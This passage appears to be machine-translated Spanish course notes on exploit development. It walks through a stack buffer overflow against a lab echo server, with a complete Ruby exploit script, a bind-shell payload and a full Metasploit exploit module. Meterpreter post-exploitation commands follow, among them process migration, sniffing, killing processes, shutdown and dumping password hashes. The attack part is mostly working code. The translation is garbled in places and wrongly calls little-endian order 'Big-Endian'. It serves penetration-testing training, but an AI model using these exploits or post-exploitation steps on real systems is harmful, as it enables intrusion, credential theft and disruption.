./pattern_create.rb -l 100 or msf-pattern_create -l 100
```

Luego enviamos la cuerda al servidor de eco:

```ruby
s = TCPSocket.new "172.16.5.10","7707"
s.gets
s.puts "<the pattern_create string>"
```

> después del accidente conseremos el valor de EIP, en este caso 35624134

Ahora utilizamos la segunda carga útil con este valor:

```ruby
./pattern_offset.rb -q <35624134> 100 or msf-pattern_offset -q <query>
# Exact match at offset 44
```

Esto significa que nuestro script debe tener 44 caracteres seguidos por una dirección de instrucción CALL ESP (o JMP)

### Writing the Payload

#### Preamble

* su espacio entre el primer byte del amortiguador vulnerable y la dirección de retorno. hemos visto que su longitud es de 44 bytes
* esto significa que podemos insertar lo que queramos en estos bytes ya que no son relevantes. por lo general es una convención común para insertar \*\* operaciones NOP\*\* como preámbulo (\*\* x90\*\* es el código HEX para NOP)

En Ruby:

```ruby
preamble = "\x90"*44
```

#### Return address

* en Windows XP SP3 podemos utilizar 0x7C868667 Para una instrucción CALL ESP

Tenemos que usar Big-Endian, así que:

```ruby
return_address = "\x67\x86\x86\x7c"
```

#### The payload

* antes de añadir la verdadera lógica de carga útil maliciosa, recuerde que después de la dirección de retorno, hay espacio asignado Para los argumentos pasados a llamar a la función.

No tiene que ser el tamaño exacto, sólo inserta suficientes NOPs antes de la carga útil real maliciosa:

|nop,nop,nop | |nop | |CALL ESP address | -> EIP register| |nop | |nop | |malicious payload |

→ arguments\_nop = "\x90"\*10

* metástaploit nos ayuda con dos herramientas: **msfpayload** y **msfencode**
* la primera se puede utilizar para generar la carga útil
* el segundo se puede utilizar para codender la carga útil para evitar los malos caracteres
* Dado que la vulnerabilidad es causada por una tiranía en una aplicación C, debemos evitar el carácter **x00** (fin de la línea); esto se debe a que strcpy detendrá la copia si se encuentra con estos bytes

```ruby
msfpayload windows/exec CMD=calc.exe R | msfencode -b "\x00" -t rb
# buf = "<the generate payload>"
```

Así que copiamos la carga útil de nuestro guión de rubí:

```ruby
calc_payload = <the generate payload>
```

Luego concatenamos todas las partes generadas anteriormente:

```ruby
exploit = preamble + return_address + arguments_nop + calc_payload
```

#### Exploitation

* podemos añadir una conexión TCP simple para enviar la carga útil

Nuestro guión completo:

```ruby
preamble = "\x90"*44
return_address = "\x67\x86\x86\x7c"
arguments_nop = "\x90"*10
calc_payload = <the generate payload>
exploit = preamble + return_address + arguments_nop + calc_payload

host,port = ARGV[0],ARGV[1]
require 'socket'
TCPSocket.open(host,port) {|s| s.puts exploit}
```

Uso:

```ruby
ruby echo_payload.rb 172.16.5.10 7707
```

> En la máquina servidor, se ha ejecutado una calculadora. La hazaña funciona.

#### Shell on the victim

En lugar de abrir una calculadora, podemos abrir una conexión de unión o inverso

With metasploit:

```ruby
windows/shell_bind_tcp
```

* ir a la msfconsole
* y ver las opciones que podemos establecer

```ruby
msfpayload windows/shell_bind_tcp LPORT=1117 R | msfencode -b "\x00" -t rb
# <output of payload>
```

> podemos utilizar la misma estructura de la explotación calc sólo tenemos que cambiar la carga útil maliciosa

* después de enviar la carga útil
* debemos abrir una telnet en ese puerto.

En kali:

```ruby
telnet 172.16.5.10 1117
# we have a shell
```

## Metasploit

```
Introduction

ELS Echo Server

Architecture and Framework

Explore and write the ELS Echo module

Meterpreter scripting
```

### Introduction

Metasploit es un marco de plumas diseñado para utilizar y desarrollar rápidamente exploits, cargas útiles, encoders y mucho más.

→ http://www.metasploit.com/

### ELS Echo Server

* en el ejemplo nuestro objetivo es una máquina de ganar xp sp3
* ip: 172.16.5.10 puerto:7707

#### The service

Simplemente se hace eco de los mensajes:

```ruby
s = TCPSocket.new "172.16.5.10","7707"
s.gets
# Output: gets banner
s.puts "hello world"
s.gets
# Output: "hello world"
```

#### The vulnerability

Si enviamos a muchos personajes el servicio se estrellará:

```ruby
s.puts "A"*100
# crashes
```

> Ahora queremos automatizar la fase de explotación. Esto evita tener que escribir un script personalizado (o una carga útil) cada vez que encontramos un servidor ELS Echoer.

#### Exploitation with Metasploit

```ruby
 → run msfconsole
 → use exploit/windows/els/echoserv
 → info
 → check // we can use this command, to see if the target is exploitable
 → set PAYLOAD < preferred payload >
 → set lhost and lport
 → exploit
 # to get a meterpreter session
```

### Architecture and Framework

→ https://github.com/rapid7/metasploit-framework/wiki#metasploit-development

Metasploit framework Architecture

\| | libraries | interfaces | |tools > | Rex | Console | | | MSF CORE | CLI | |plugins >| MSF BASE | < WEB | | modules | | payloads | exploits | encoders | post-modules | auxiliary |

Path in kali:

```ruby
/usr/share/metasploit-framework
```

Trayecario útil Para módulos y plugins de usuario locales:

```ruby
~/.msf4
```

### Interfaces

#### Msfconsole

* El más utilizado. es una interfaz compleja y un comando shell también.
* con la opción **msfconsole -h** podemos ver información de uso

#### Msfcli

* su interfaz de línea de comandos en el marco de metálato.
* u puede utilizar para lanzar exploits o manejador rápidamente
* es la mejor opción si ya sabes lo que tienes que hacer y no quieres usar la msfconsola
* usando **mfcli -h** opción podemos ver información de uso

Ejemplo:

```ruby
msfcli exploit/windows/els/echoserv RHOST=172.16.5.10 E
// E = execute 
// rport,target and payloads options are taken as default
```

#### Web interface

Uso:

```ruby
 → service metasploit start
 → its in localhost:3790
 → to use it, a registration is required but its free and quick
```

* u puede construir sus propios proyectos y realizar las mismas cosas que u puede hacer con msfconsole

Ejemplo de uso:

```ruby
search modules > echoserv
```

* ahora podemos establecer las opciones a través de la interfaz
* después de correr, tenemos una sesión de medición en la pestaña **sessions**

Tenemos varias características para interactuar con la sesión:

```ruby
- // collect system data, virtual desktop, access filesystem, search filesystem, command shell, create proxy pivot, create VPN pivot, terminate session
```

* puede ser útil si tienes que automatizar una gran cantidad de tareas
* sin embargo algunas características no están disponibles en la versión de comunidad gratuita (como autoexplotación)

#### Others

→ /usr/share/metasploit-framework > ls

* luego comprobar las opciones con **-h** para listar más información

Example:

```ruby
msfvenom -h
```

### Libraries

→ /usr/share/metasploit-framework/lib > ls

→ moreover the libraries: https://github.com/rapid7/metasploit-framework/blob/master/documentation/developers\_guide.pdf

* u can explore its modules, classes, utilities etc to use its libraries in your scripts without using any Metasploit interface
* https://github.com/rapid7/metasploit-framework/wiki#metasploit-development
* Metasploit provides very good API documentation that shows u the code of each method u want to know

→ https://rapid7.github.io/metasploit-framework/api/

#### Rex library

* La biblioteca de extensión Ruby es la más importante de todo el marco
* proporciona una colección de clases y módulos básicos útiles Para casi todas las tareas marco: protocolos, enchufadores, servicios, encoseores, transformaciones de texto, etc.

→ /usr/share/metasploit-framework/lib/rex/ > ls

> Además, u puede ver que la documentación de la API puede ayudarle a entender todas las características de Rex: http://rapid7.github.io/metasploit-framework/api/

#### Core library

Implementa el conjunto de clases y utilidades que se pueden utilizar como interfaz con los módulos y plugins del marco

→ /usr/share/metasploit-framework/lib/msf/core > ls

* se puede utilizar con un enfoque basado en la instancia
* La instancia contiene todo el estado marco y u puede crearlo usando la **Msf::Framework.new**
* la instancia central puede gestionar módulos, plugins, sesiones, trabajos, etc.
* utiliza características de la biblioteca de Rex
* u también puede utilizar la documentación de la API (**noMsf** en este caso)
* también contiene clases definidas en la biblioteca de la Base

#### Base library

* su desarrollado encima de la biblioteca Core y hace más fácil interactuar con la estructura marco. su propósito es proporcionar APIs simplificadas y más fáciles de usar para mejorar y acelerar el desarrollo
* /usr/share/metasploit-framework/lib/msf/base > ls

### Modules

* la parte que utilizan los usuarios para realizar explotacións y realizar actividades de pruebas de penetración
* si se desarrolla un nuevo módulo de carga útil, todas las hazañas pueden utilizarlo automáticamente gracias a la estructura marco.

→ /usr/share/metasploit-framework/modules

Modules:

```ruby
- payloads
- exploits
- encoders
- post-modules
- auxiliary
```

#### exploits

→ /usr/share/metasploit-framework/modules/exploits

* handlers son también los módulos de explotación.

Por ejemplo:

```ruby
use exploit/multi/handler
```

> Las conexiones inversas se pueden utilizar para eludir las reglas de NAT ya que es la víctima la que inicia el apretón de manos

#### auxiliary

* se utilizan para realizar operaciones diferentes de la explotación. generalmente se utilizan cuando no hay necesidad de una carga útil o un objetivo.
* como la Denegación de Servicios (DOS) ataques mientras que algunos otros se utilizan como escáneres, colecciones de información y así en.

#### payloads

* u siempre usará un módulo de carga útil cuando u lance un exploit (recuerde que u usualmente hace un comando **SET PAYLOAD**)
* encapsularan el verdadero código malicioso que se va a ejecutar si la explotación tiene éxito (las instrucciones crudas que permiten tomar el control de la máquina de destino explotada)

→ /usr/share/metasploit-framework/modules/payloads

Types:

```ruby
 → single
 → stagers
 → stages
```

* single: (_me_) tiene todo el código bruto para realizar una tarea particular. ejemplo: bind-shell es una sola carga útil porque no requiere código adicional.
* una conexión de medidor de más se requiere un escenador y una carga útil escenificada
* escenario: se utiliza para establecer la conexión entre el objetivo y la máquina atacante
* entonces, una carga útil escenificada se envía a la víctima objetivo y su verdadero código en bruto malicioso.

#### Nops and Encoders

* son módulos relacionados con la fase de explotación
* los módulos nops se utilizan para generar instrucciones que no tienen ningún efecto a la máquina de destino. Una instrucción típica nop es **x90**
* algunos nops son detectados por AV, por lo tanto, la metástate proporciona algunos módulos generadores de nops que u puede utilizar para generar otros más sofisticados.

Los codificadores son otro tipo de módulo utilizado para mejorar su generación de carga útil con el fin de hacerlos indetectables de AVs:

```ruby
/usr/share/metasploit-framework/modules/encoders
/usr/share/metasploit-framework/modules/nops
```

#### Post

* utilizados para realizar tareas de post explotación y theregore pueden requerir una sesión de medición activa con la que interactuar como opción.

Podemos usar con **run** comando:

```ruby
run post/*
- /usr/share/metasploit-framework/modules/post
```

#### Plugin

* utilizados para ampliar las capacidades marco
* a menudo se desarrollan para proporcionar un puente entre el marco de metástasis y otras herramientas de pentesting

→ /usr/share/metasploit-framework/plugins

Algunos plugin están relacionados con otras herramientas de lápiz, tales como:

```ruby
- openvas
- nessus
- nexpose
```

#### Tools

* son scripts particulares que utilizan principalmente la biblioteca Ruby Extension (Rex) para realizar algunas tareas que no requieren interacción o estructura marco.
* si quieres usar algunas clases o características de Rex, u r escribiendo lo que se llama una herramienta dependiente de la metástasis y tienes que incluirlo en la biblioteca Rex.

→ /usr/share/metasploit-framework/tools

Example:

```ruby
pattern_create.rb
pattern_offset.rb
```

### Write a Module

#### Module type and location

* first thing > identify the module type

En este caso, el módulo que vamos a desarrollar es un módulo \*\* de explotación\*\* (ya que queremos explotar una vulnerabilidad de desbordamiento de amortiguamiento del servidor de ecos els)

* sabemos que apunta a aplicaciones que se ejecutan en Windows
* estas informaciones son importantes porque nos dice dónde debe almacenarse el módulo de archivo Ruby real para que sea reconocible por el marco

Usage:

```ruby
use exploit/windows/els/echoserv
```

Podemos poner el módulo en dos lugares:

```ruby
/usr/share/metasploit-framework/modules/exploits/windows
# the framework file system

~/.msf4/modules/exploits/windows
# the dir reserved to the private user modules and plugins
```

> La segunda es mejor causa evitar cualquier problema relacionado con las actualizaciones marco

Empieza el postgrestdb:

```ruby
systemctl start postgresql.service
updatedb
msfconsole # only then the msf will recognize ur new module
```

#### Module high level structure

Estructura de alto nivel de un módulo genérico:

```ruby
module type
module requirements
module information
module operations
```

```ruby

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  include Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(info,
        'Name' => 'Exploit name',
        'Description' => %q{ This module exploits a .....}, # end of description
        'Author' => 'the author name', #-------
      )
    )
  end

  def check
    # ----
  end

  def exploit
    # ----
  end
end


```

* en este caso, vamos a hacer una bof explotación
* la biblioteca msf/core casi siempre es necesaria Para el módulo de metástasis

```ruby

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  # module body
end
```

→ http://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit/Remote

La clase de exploit remoto es una especialización de la clase de módulo de exploit que está orientada a las hazañas se realizan contra objetivos distintos a la máquina local. Esto normalmente implica explotar otras máquinas a través de una conexión de red, aunque no se limita a este ámbito

Dado que la conexión que queremos establecer con el objetivo vuln es una tcp, necesitamos establecer los métodos correctos

→ http://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit/Remote/Tcp

```ruby

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  # we need a tcp connection
  include Exploit::Remote::Tcp
  # module body
end

```

> El comando **reload** en metástasis se puede utilizar para recargar los cambios que u ha hecho en el módulo.

#### Module information

* Lo primero que hay que hacer es **inicial** el módulo con la información relacionada con el propio módulo
* otra forma de explorar la documentación metástasis es echando un vistaza al código mostrado por la API de inicialiaze Para cada clase de la cadena de clases.

Ejemplo:

```ruby
Class: Msf::Exploit::Remote
Object < Module < Msf::Exploit < Msf::Exploit::Remote
```

Para establecer la información del módulo:

```ruby
def initialize(info = {})
  super(
    update_info(info,
      'Name' => 'Els ECHO Server',
      'Description' => %q{
        This module exploits a buffer overflow found in the Els ECHO Server.
      },
      'Author' => 'eLearnSecurity',
      'License' => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
          'RPORT' => '7707'
        },
      'Payload' =>
        {
          'BadChars' => "\x00",
        },
      'Platform' => 'win',
      'Targets' =>
        [
          ['Windows XP SP3', { 'Ret' => 0x7c868667 }],
          ['Windows 7', { 'Ret' => 0x772A2E2B }]
        ],
      'DefaultTarget' => 0
    ) # End of update_info
  ) # End of super
end # End initialize


```

**EXITFUNC => process** significa que cuando u cierra la conexión con la carga útil especificada (metropreter, shell, etc.) el proceso remoto termina también; no está disponible Para más conexiones.

**Payload** se utiliza para especificar información sobre la generación de carga útil (codificación, carácter para evitar, espacio y así en). En este caso sólo tenemos que especificar un personaje malo **x00**

**Platform**=>ganar significa que la plataforma de destino es Windows. Cuando usamos **show payloads** comando, solo se mostrarán cargas útiles de Windows.

**Targets** se utiliza para especificar información sobre los diversos tipos de objetivos

* Diferentes sistemas operativos tienen diferentes direcciones de retorno para usar en el exploit (la dirección de un ESP de CALL Por ejemplo). Por lo tanto, usando Targets, u puede parametrizar el script.

**DefaultTarget**=>0 significa que cuando u carga el módulo (mandúr comando de uso) el valor de TARGET ya está configurado a 0; en nuestro caso su Windows XP SP3 (el primer valor en la matriz de Targets)

```ruby
show options
# when we load the module we have some options set like RPORT and TARGET
```

#### The check method

**check** se utiliza para verificar si el objetivo es explotable y no un comando obligatorio (no utilizado por pentesters)

In msf:

```ruby
check

# its gonna check the target and default port 
```

* comprueba el banner con **s.gets**
* si el banner es **ELS Echo Server 1.1**, tratamos el servicio de destino como vulnerable

```ruby

def check
  connect
  banner = sock.gets()
  disconnect
	
  if (banner =~/ELS Echo Server 1.1/)
    return Exploit::CheckCode::Vulnerable
  end

  return Exploit::CheckCode::Safe
end
# other module methods
```

Connect se utiliza para crear una conexión tcp al objetivo remoto

La información objetivo se recuperará de los parámetros RHOST y RPORT

Es un método proporcionado por Remote::Tcp

El atributo para interactuar con la conexión TCP es **sock**:

```ruby
socks.gets() 
# to get the banner sent by the server
```

> después de conseguir el estandarte, podemos verificar su valor y devolverlo

#### The exploit method

* envuelve el código lógico de explotación real

→ use exploit/windows/els/echoserv

Set options:

```ruby
def exploit
  connect
  print_status("Connected to #{datastore['RHOST']}:#{datastore['RPORT']}")

  handler

  print_status("Trying target #{target.name}")
  buff = "\x90"*44 + [target.ret].pack('V') + "\x90"*10 + payload.encoded
  sock.put(buff)
  disconnect
end
```

Connect se utiliza para establecer una conexión TCP con el objetivo RHOST y RPORT

Impresión.estadio produce alguna información, mientras que la tienda de datos es una matriz que contiene las opciones marco.

Handler se utiliza para abrir un enchufe de escucha a la LHOST y LPORT

Buff almacena nuestra carga útil completa

* El objetivo y la carga útil son dos atributos proporcionados por la Msf::Explotit::Remote class.

Moreover:

→ http://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Module/Target

→ http://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Payload

La carga útil envía 44 nops

* target.ret, obtener la dirección de retorno especificada en el método inicializar
* el método pack(V') se utiliza para convertir la dirección de retorno (target.ret) en secuencia binaria (32-bit endiante).
* Después de eso, le añadimos más nops.
* tiendas payload.encoded almacena la carga útil codificado. tiene en cuenta el parámetro establecido en la configuración del módulo
* el atributo calceal se puede utilizar para interactuar con el servicio
* con calcerio.puto(buff), enviamos toda la carga útil (buff) al servidor utilizando el enchufe disponible
* desconectar, cierra la conexión
* si la explotación tiene éxito, obtendremos una sesión de medición. gracias al manejador, la corriente se abre automáticamente.

Estamos usando el **x90** como Nops, pero el marco de metástasis nos permite generar nops sofisticados con la instrucción **make-nops**.

```ruby
buff = make_nops(44) + [target.ret].pack('V') + make_nops(10) + payload.encoded
```

Podemos parametrizar la generación de amortiguación utilizando algunos parámetros de carga útil:

```ruby

'Payload' =>
{
  'Offset-1' => 44,
  'Offset-2' => 10,
  'BadChars' =: "\x00",
}

buff = make_nops(payload_info['Offset-1']) + [target.ret].pack('V') + make_nops(payload_info['Offset-2']) + payload.encoded
```

> También podemos parametrizar la generación de amortiguación usando parámetros de destino

Es una situación común en la que diferentes objetivos requiere diferentes espacios de compensación o carga útil para realizar la explotación

#### Targets considerations

* tenemos 2 metas, xp y win7
* xp no implementa ASLR (Aleatorización de diseño espacial de la vuelta) como win7 hace
* si quieres probar en otro sistema, u tienes que obtener la dirección de retorno de ese sistema, su LLLLV o similar (JMP ESP Por ejemplo)

Encuentra la dirección de una win7 usando la herramienta **findjmp.exe**:

```ruby
findjmp.exe Kernel32.dll ESP
# Output: 0x77252E2B call esp
```

Ahora podemos insertar esta dirección en nuestro módulo Para el objetivo correcto:

* 'Windows 7',{ 'Ret'=>0x77252E2B}

### Meterpreter Scripting

* es una de las cargas útiles disponibles en el marco de la metástasis
* tiene diferentes tipos de actividades de pénspidos, como la recolección de datos, pivotación, etc.

#### Meterpreter Basic API

Explore el código disponible:

```ruby
/usr/share/metasploit-framework/lib/rex/post/meterpreter
```

* u puede probar las API utilizando el intérprete de irb disponible en cada sesión de medición

Aquí se pueden encontrar scripts preter predeterminados:

```ruby
/usr/share/metasploit-framework/scripts/meterpreter
```

* ejemplos: hashdump, killav, migrate, scraper, autoroute and so on
* podemos usarlos con el comando **run**

U puede ejecutar sus propios scripts de medidor preter ponerlos en su dir local:

```ruby
.msf4/scripts/meterpreter/
```

#### video

In meterpreter session:

```ruby
irb
client.session_host # ip of the target machine
client.session_port 
client.methods # list of methods that we can use
client.methods.each{ |m| puts m}
client.public_methods.each{ |m| puts m}
client.info # show current user
client.exploit # info about the payload used
client.exploit.datastore['PAYLOAD']
client.print_good "OK"
client.print_status "OK"
client.print_warning "OK"
client.print_error "OK"
```

→ /usr/share/metasploit-framework/lib/rex/post

* edit meterpreter.rb

cd meterpreter - edit client.rb:

```ruby
client.core
client.sniffer # error
client.use["sniffer"] # error
client.core.use["sniffer"] # it works
```

Ahora podemos usar la extensión olfatil:

```ruby
client.sniffer
```

In meterpreter:

```ruby
use sniffer
sniffer 
# it shows the options
```

In irb:

```ruby
client.sniffer
client.sniffer.interfaces[0]['description']
```

* irb:

Coge el PID que quieres migrar con ps:

```ruby
client.core.migrate(552) # true
getpid // get current PID
```

#### fs and file

```ruby
client.fs.dir.pwd # current path
client.fs.dir.entries # list the directory
client.fs.dir.chdir("../") # cd to parent folder
client.fs.file.search(client.fs.dir.pwd,"*.exe") //list all exe files in the dir
client.fs.file.stat("<file>") # get info about the file
client.fs.file.exists? "<file>" # true or false
```

* unlink or delete //para borrar un archivo
* upload or download

#### sys config

```ruby
client.sys.config.getuid # the same as getuid in meterpreter
client.sys.config.sysinfo
client.platform
client.sys.config.getprivs
```

#### sys process

```ruby
client.sys.process.getpid # current pid
client.sys.process.processes[0]
client.sys.process['explorer.exe'] # pid of the process
client.sys.process.kill(368)
```

#### net config

```ruby
config.net.config.get_interfaces[0]
config.net.config.get_interfaces[0].class
config.net.config.get_interfaces[0].addrs
config.net.config.get_interfaces[0].pretty
puts config.net.config.get_interfaces[0].pretty
client.net.config.each_interface { |i| puts i.pretty }
config.net.config.netstat[0]
config.net.config.arp_table[0]
config.net.config.arp_table[0].ip_addr
config.net.config.arp_table[0].mac_addr
```

```ruby
- more options For client.net.config.<option>:
get_routes
add_route
remove_route
get_proxy_config
resolve # to get dns
```

#### sys power

```ruby
client.sys.power.shutdown 
# shutdown the victim machine
```

#### scraper

In meterpreter:

```ruby
run scraper -h 
# get system info including network shares, registry hives and password hashes
```

> Copia el meterpreter.script.template.rb a .msff4/scripts/metropreter
